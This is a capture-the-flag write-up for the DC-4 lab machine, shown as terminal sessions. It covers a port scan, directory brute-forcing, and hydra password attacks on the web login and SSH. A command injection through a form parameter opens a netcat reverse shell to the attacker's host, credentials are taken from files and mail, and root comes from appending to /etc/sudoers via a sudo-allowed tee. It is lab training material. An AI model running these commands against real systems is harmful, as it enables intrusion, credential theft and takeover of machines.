# DC-4  
  
**URL: http://www.five86.com/dc-4.html**  
  
First of all, big thanks to @DCAU7 for sharing these machines with the community.   
  
### NMAP  
  
root@kali:~# nmap -A 192.168.111.6  
>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-17 07:33 CDT  
>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
>Nmap scan report for 192.168.111.6  
>Host is up (0.00083s latency).  
>Not shown: 998 closed ports  
>PORT   STATE SERVICE VERSION  
>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)  
>| ssh-hostkey:   
>|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)  
>|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)  
>|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)  
>80/tcp open  http    nginx 1.15.10  
>|_http-server-header: nginx/1.15.10  
>|_http-title: System Tools  
  
### HTTP  
  
The http just had a login page. Nothing more. Instead of going for the bruteforce, my first choice is to scan first. See if I can do anything without being logged in. First, let's scan:  
  
root@kali:~# dirb hxxp://192.168.111.6/ /usr/share/dirb/wordlists/big.txt -x /usr/share/dirb/wordlists/extensions_common.txt -r  
>  
>DIRB v2.22      
>By The Dark Raver  
>  
>START_TIME: Wed Apr 17 08:34:59 2019  
>URL_BASE: hxxp://192.168.111.6/  
>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt  
>EXTENSIONS_FILE: /usr/share/dirb/wordlists/extensions_common.txt | ()(.asp)(.aspx)(.bat)(.c)(.cfm)(.cgi)(.com)(.dll)(.exe)(.htm)(.html)(.inc)(.jhtml)(.jsa)(.jsp)(.log)(.mdb)(.nsf)(.php)(.phtml)(.pl)(.reg)(.sh)(.shtml)(.sql)(.txt)(.xml)(/) [NUM = 29]  
>OPTION: Not Recursive  
>  
>  
>GENERATED WORDS: 20458                                                           
>  
>---- Scanning URL: hxxp://192.168.111.6/ ----  
>+ hxxp://192.168.111.6/command.php (CODE:302|SIZE:704)                                                                          
>==\> DIRECTORY: hxxp://192.168.111.6/css/                                                                                        
>+ hxxp://192.168.111.6/css/ (CODE:403|SIZE:556)                                                                                 
>==\> DIRECTORY: hxxp://192.168.111.6/images/                                                                                     
>+ hxxp://192.168.111.6/images/ (CODE:403|SIZE:556)                                                                              
>+ hxxp://192.168.111.6/index.php (CODE:200|SIZE:506)                                                                            
>+ hxxp://192.168.111.6/login.php (CODE:302|SIZE:206)                                                                            
>+ hxxp://192.168.111.6/logout.php (CODE:302|SIZE:163)          
  
Great, a command.php page. Let's see what we got here:  
  
root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' 'hxxp://192.168.111.6/command.php'  
>...  
>\<form method="post" action="command.php"\>  
>	\<strong\>Run Command:\</strong\>\<br\>  
>	\<input type="radio" name="radio" value="ls -l" checked="checked"\>List Files\<br /\>  
>	\<input type="radio" name="radio" value="du -h"\>Disk Usage\<br /\>  
>	\<input type="radio" name="radio" value="df -h"\>Disk Free\<br /\>  
>	\<p\>  
>	\<input type="submit" name="submit" value="Run"\>  
>\</form\>  
>You need to be logged in to use this system.<p\><a href='index.php'\>Click to Log In Again</a\>	  
>...  
  
Wow, a radio parameter with a command to run in the server...  
  
root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=ls+-l&submit=Run' 'hxxp://192.168.111.6/command.php'  
>...  
>\<form method="post" action="command.php"\>  
>	\<strong\>Run Command:\</strong\>\<br\>  
>	\<input type="radio" name="radio" value="ls -l" checked="checked"\>List Files\<br /\>  
>	\<input type="radio" name="radio" value="du -h"\>Disk Usage\<br /\>  
>	\<input type="radio" name="radio" value="df -h"\>Disk Free\<br /\>  
>	\<p\>  
>	\<input type="submit" name="submit" value="Run"\>  
>\</form\>  
>You need to be logged in to use this system.<p\><a href='index.php'\>Click to Log In Again</a\>	  
>...  
  
The same result...Here we can hope that the command is being executed but the result won't show if you are not logged in. Sounded great, but it was not the case. So, we are left with a bruteforce to the login panel... Let's run hydra:  
  
root@kali:~# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.111.6 http-post-form "/login.php:username=^USER^&password=^PASS^:F=login.php:H=Cookie\: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7" -e nsr -u    
>Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
>  
>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-18 00:39:56  
>[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.  
>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore  
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 86066412 login tries (l:6/p:14344402), ~5379151 tries per task  
>[DATA] attacking http-post-form://192.168.111.6:80/login.php:username=^USER^&password=^PASS^:F=login.php:H=Cookie\: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7  
>[STATUS] 1136.00 tries/min, 1136 tries in 00:01h, 86065276 to do in 1262:42h, 16 active  
>[80][http-post-form] host: 192.168.111.6   login: Admin   password: happy  
  
### BASIC SHELL  
  
Here we go. Now we have our credentials: "Admin:happy" and we can start testing. First, let's see if we can change the command that is being executed:  
  
root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=id&submit=Run'     'hxxp://192.168.111.6/command.php'  
>...  
>You have selected: id\<br /\>\<pre\>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
>...  
  
Now, just have to pup up a shell and have fun :)  
  
root@kali:~# curl -H 'Cookie: PHPSESSID=mf6fjsv8ve3ln8jchi3p0ue3i7' -d 'radio=nc+192.168.111.5+4444+-e+/bin/bash&submit=Run' 'hxxp://192.168.111.6/command.php' -v  
  
root@kali:~# nc -nlvp 4444  
>listening on [any] 4444 ...  
>connect to [192.168.111.5] from (UNKNOWN) [192.168.111.6] 35014  
>id  
>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
>python -c 'import pty;pty.spawn("/bin/bash")'  
  
www-data@dc-4:/usr/share/nginx/html$ id  
>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
  
www-data@dc-4:/usr/share/nginx/html$ hostname  
>dc-4  
  
Let's check if there are any users in this machine. After all, there was a SSH service running...  
  
www-data@dc-4:/usr/share/nginx/html$ cat /etc/passwd  
>root: x :0:0:root:/root:/bin/bash  
>...  
>charles: x :1001:1001:Charles,,,:/home/charles:/bin/bash  
>jim: x :1002:1002:Jim,,,:/home/jim:/bin/bash  
>sam: x :1003:1003:Sam,,,:/home/sam:/bin/bash  
  
Charles, Jim and SAM... With their own home folders...  
  
www-data@dc-4:/usr/share/nginx/html$ ls -lrth /home/*/  
>/home/jim/:  
>total 12K  
>-rw------- 1 jim jim  528 Apr  6 20:20 mbox  
>-rwsrwxrwx 1 jim jim  174 Apr  6 20:59 test.sh  
>drwxr-xr-x 2 jim jim 4.0K Apr  7 02:58 backups  
>  
>/home/charles/:  
>total 0  
>  
>/home/sam/:  
>total 0  
  
Interesting, backups?  
  
www-data@dc-4:/home/jim$ file backups/old-passwords.bak  
>backups/old-passwords.bak: ASCII text  
  
www-data@dc-4:/home/jim$ cat backups/old-passwords.bak  
>000000  
>12345  
>iloveyou  
>1q2w3e4r5t  
>1234  
>123456a  
>qwertyuiop  
>...  
  
### SSH - JIM  
  
It seems like a dictionary of passwords... let's run hydra again:  
  
root@kali:~# hydra -l jim -P jimpass.txt ssh://192.168.111.6   
>Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
>  
>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-18 01:01:58  
>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task  
>[DATA] attacking ssh://192.168.111.6:22/  
>[STATUS] 183.00 tries/min, 183 tries in 00:01h, 76 to do in 00:01h, 16 active  
>[22][ssh] host: 192.168.111.6   login: jim   password: jibril04  
>1 of 1 target successfully completed, 1 valid password found  
>[WARNING] Writing restore file because 10 final worker threads did not complete until end.  
>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-18 01:03:37  
  
Well, it seems we are Jim now ^^  
  
After some enumerating, breath... Let's see what services are running in the machine:  
  
jim@dc-4:~$ ss -a | grep LISTEN  
>...          
>tcp    LISTEN     0      20     127.0.0.1:smtp                  *:*                      
>tcp    LISTEN     0      128     *:http                  *:*                      
>tcp    LISTEN     0      128     *:ssh                   *:*                      
>tcp    LISTEN     0      20        ::1:smtp                 :::*                      
>tcp    LISTEN     0      128    :::http                 :::*                      
>tcp    LISTEN     0      128    :::ssh                  :::*                     
  
SMTP service running only in localhost? That's a little weird... any interesting mails?  
  
jim@dc-4:~$ cat /var/spool/mail/jim   
>From charles@dc-4 Sat Apr 06 21:15:46 2019  
>Return-path: \<charles@dc-4\>  
>Envelope-to: jim@dc-4  
>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000  
>Received: from charles by dc-4 with local (Exim 4.89)  
>	(envelope-from \<charles@dc-4\>)  
>	id 1hCjIX-0000kO-Qt  
>	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000  
>To: jim@dc-4  
>Subject: Holidays  
>MIME-Version: 1.0  
>Content-Type: text/plain; charset="UTF-8"  
>Content-Transfer-Encoding: 8bit  
>Message-Id: \<E1hCjIX-0000kO-Qt@dc-4\>  
>From: Charles \<charles@dc-4\>  
>Date: Sat, 06 Apr 2019 21:15:45 +1000  
>Status: O  
>  
>Hi Jim,  
>  
>I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.  
>  
>Password is:  ^xHhA&hvim0y  
>  
>See ya,  
>Charles  
  
Hi Charles :D, great... Charles gave us a mission. Let's see if anything went wrong during his holidays \>.<  
  
### PRIVILEGE ESCALATION  
  
jim@dc-4:~$ su charles  
>Password:   
  
charles@dc-4:/home/jim$ id  
>uid=1001(charles) gid=1001(charles) groups=1001(charles)  
  
charles@dc-4:/home/jim$ sudo -l  
>Matching Defaults entries for charles on dc-4:  
>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
>  
>User charles may run the following commands on dc-4:  
>    (root) NOPASSWD: /usr/bin/teehee  
  
/usr/bin/teehee? What is that and what can we do with it?  
  
charles@dc-4:/home/jim$ /usr/bin/teehee --help  
>Usage: /usr/bin/teehee [OPTION]... [FILE]...  
>Copy standard input to each FILE, and also to standard output.  
>  
>  -a, --append              append to the given FILEs, do not overwrite  
>  -i, --ignore-interrupts   ignore interrupt signals  
>  -p                        diagnose errors writing to non pipes  
>      --output-error[=MODE]   set behavior on write error.  See MODE below  
>      --help     display this help and exit  
>      --version  output version information and exit  
>  
>MODE determines behavior with write errors on the outputs:  
>  'warn'         diagnose errors writing to any output  
>  'warn-nopipe'  diagnose errors writing to any output not a pipe  
>  'exit'         exit on error writing to any output  
>  'exit-nopipe'  exit on error writing to any output not a pipe  
>The default MODE for the -p option is 'warn-nopipe'.  
>The default operation when --output-error is not specified, is to  
>exit immediately on error writing to a pipe, and diagnose errors  
>writing to non pipe outputs.  
>  
>GNU coreutils online help: <hxxp://www.gnu.org/software/coreutils/\>  
>Report tee translation bugs to <hxxp://translationproject.org/team/\>  
>Full documentation at: <hxxp://www.gnu.org/software/coreutils/tee\>  
>or available locally via: info '(coreutils) tee invocation'  
  
Great, tee. I can think at list in a couple files that I can edit to do the privilege escalation. Let's go easy and make us sudo masters ^^  
  
charles@dc-4:/home/jim$ echo "charles ALL=(ALL) NOPASSWD:ALL" | sudo /usr/bin/teehee -a /etc/sudoers  
>charles ALL=(ALL) NOPASSWD:ALL  
  
charles@dc-4:/home/jim$ sudo su  
root@dc-4:/home/jim# id  
>uid=0(root) gid=0(root) groups=0(root)  
  
  
Well, we did it. Big thanks to @DCAU7 for creating these machines. Great work! I'll be waiting for the next one :)
